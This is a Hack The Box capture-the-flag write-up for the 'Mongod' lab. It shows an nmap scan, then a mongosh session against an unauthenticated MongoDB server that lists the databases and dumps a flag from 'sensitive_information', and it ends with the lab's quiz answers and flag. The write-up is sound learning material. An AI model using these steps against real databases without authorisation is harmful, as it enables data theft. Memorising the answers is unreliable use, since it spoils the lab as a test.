# Mongod

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 0

## Solution

#### 1. How many TCP ports are open on the machine?

*(22 and 27017)*

> 2

#### 2. Which service is running on port 27017 of the remote host?

```sh
$ nmap -sV -p27017 10.129.189.165
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-02 11:35 CET
Nmap scan report for 10.129.189.165
Host is up (0.030s latency).

PORT      STATE SERVICE VERSION
27017/tcp open  mongodb MongoDB 3.6.8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.47 seconds
```

> MongoDB 3.6.8

#### 3. What type of database is MongoDB? (Choose: SQL or NoSQL)

> NoSQL

#### 4. What is the command name for the Mongo shell that is installed with the mongodb-clients package?

> mongo

#### 5. What is the command used for listing all the databases present on the MongoDB server? (No need to include a trailing ;)

> show dbs

#### 6. What is the command used for listing out the collections in a database? (No need to include a trailing ;)

> show collections

#### 7. What is the command used for dumping the content of all the documents within the collection named flag in a format that is easy to read?

> db.flag.find().pretty()

#### Submit root flag

*(On `MacOS` I use `mongosh` instead of `mongo`)*

```sh
$ mongosh 10.129.189.165
Current Mongosh Log ID:	65e3014842a34027f4314538
Connecting to:		mongodb://10.129.189.165:27017/?directConnection=true&appName=mongosh+2.1.5
(node:67997) [DEP0040] DeprecationWarning: The `punycode` module is deprecated. Please use a userland alternative instead.
(Use `node --trace-deprecation ...` to show where the warning was created)
Using MongoDB:		3.6.8
Using Mongosh:		2.1.5

For mongosh info see: https://docs.mongodb.com/mongodb-shell/

------
   The server generated these startup warnings when booting
   2024-03-02T09:26:05.035+0000: 
   2024-03-02T09:26:05.035+0000: ** WARNING: Using the XFS filesystem is strongly recommended with the WiredTiger storage engine
   2024-03-02T09:26:05.035+0000: **          See http://dochub.mongodb.org/core/prodnotes-filesystem
   2024-03-02T09:26:08.598+0000: 
   2024-03-02T09:26:08.598+0000: ** WARNING: Access control is not enabled for the database.
   2024-03-02T09:26:08.598+0000: **          Read and write access to data and configuration is unrestricted.
   2024-03-02T09:26:08.598+0000:
------

test> show dbs
admin                  32.00 KiB
config                 72.00 KiB
local                  72.00 KiB
sensitive_information  32.00 KiB
users                  32.00 KiB
test> use sensitive_information
switched to db sensitive_information
sensitive_information> show collections
flag
sensitive_information> db.flag.find().pretty()
[
  {
    _id: ObjectId('630e3dbcb82540ebbd1748c5'),
    flag: '1b6e6fb359e7c40241b6d431427ba6ea'
  }
]
```

## Final Flag

> 1b6e6fb359e7c40241b6d431427ba6ea

*Created by [bu19akov](https://github.com/bu19akov)*